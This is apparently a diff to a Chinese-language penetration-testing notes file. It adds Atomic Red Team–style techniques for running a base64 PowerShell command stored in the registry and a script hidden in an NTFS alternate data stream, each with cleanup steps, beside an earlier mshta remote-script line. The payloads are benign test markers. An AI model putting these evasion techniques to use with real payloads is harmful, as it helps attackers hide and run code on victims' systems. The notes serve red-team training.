@@ -35,6 +35,9 @@
     - [Msxml2.ServerXmlHttp](#msxml2serverxmlhttp)
     - [Xml.XmlDocument](#xmlxmldocument)
     - [mshta](#mshta)
+  - [编写与执行脚本](#编写与执行脚本)
+    - [base64编码命令写入注册表然后读取解码并IEX执行](#base64编码命令写入注册表然后读取解码并iex执行)
+    - [利用NTFS的ADS特性将脚本写入文件隐藏数据流](#利用ntfs的ads特性将脚本写入文件隐藏数据流)
   - [域渗透](#域渗透)
     - [域内提权-42278/42287](#域内提权-4227842287)
 
@@ -1092,6 +1095,91 @@ C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https:/
 ```
 
 ![image-20231205000133728](http://cdn.ayusummer233.top/DailyNotes/202312050001127.png)
+
+---
+
+
+## 编写与执行脚本
+
+### base64编码命令写入注册表然后读取解码并IEX执行
+
+```powershell
+# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
+# 添加一个新的注册表项
+reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
+# 获取, 解码并执行注册表项中的数据
+iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
+```
+
+- `/v ART`: 创建一个名为 `ART` 的值
+- `/t REG_SZ`: 设置值的类型为 `REG_SZ`
+- `/d xxx`: `/d` 表示设置值的数据; `xxx` 为数据内容, 这里是一串 base64 编码的数据
+- `/f`: 强制覆盖已有的注册表项
+- `iex`: `Invoke-Expression` 的别名, 执行字符串中的命令
+- `gp`: `Get-ItemProperty` 的别名, 获取注册表项的属性
+
+-- -
+
+检查上述注册表项以及文件是否存在
+
+```powershell
+Test-Path -Path C:\Windows\Temp\art-marker.txt
+Test-Path -Path HKCU:\Software\Classes\AtomicRedTeam
+```
+
+-- -
+
+清理上述命令创建的注册表项与文件
+
+```powershell
+Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
+Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
+```
+
+-- -
+
+### 利用NTFS的ADS特性将脚本写入文件隐藏数据流
+
+```powershell
+Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
+$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
+Invoke-Expression $streamcommand
+```
+- `Add-Content`: 将内容添加到文件中
+- `-Path $env:TEMP\NTFS_ADS.txt`: 指定文件路径
+- `-Value 'Write-Host "Stream Data Executed"'`: 指定要添加的内容
+- `-Stream 'streamCommand'`: 指定要添加到的数据流
+- `Get-Content`: 获取文件的内容
+- `-Path $env:TEMP\NTFS_ADS.txt`: 指定文件路径
+- `-Stream 'streamcommand'`: 指定要获取的数据流
+- `Invoke-Expression`: 执行字符串中的命令
+
+ADS(Alternate Data Stream) 是 NTFS 文件系统的一个特性, 它允许在文件中包含"隐藏"的数据流, 这些数据流与文件的主题内容分开存储, 不会显示在标准的文件浏览器中
+
+-- -
+
+```powershell
+# 查看文件内容
+Get-Content -Path $env:TEMP\NTFS_ADS.txt
+# 查看文件的数据流
+Get-Item -Path $env:TEMP\NTFS_ADS.txt -Stream *
+# 查看文件的 streamCommand 数据流
+Get-Item -Path $env:TEMP\NTFS_ADS.txt -Stream streamCommand
+# 查看 streamCommand 数据流的内容
+Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream streamCommand
+```
+
+![image-20231205152104997](http://cdn.ayusummer233.top/DailyNotes/202312051524557.png)
+
+![image-20231205152150150](http://cdn.ayusummer233.top/DailyNotes/202312051524394.png)
+
+
+-- -
+
+```powershell
+# 清理文件
+Remove-Item -Path $env:TEMP\NTFS_ADS.txt -Force -ErrorAction Ignore
+```
 
 ---
 
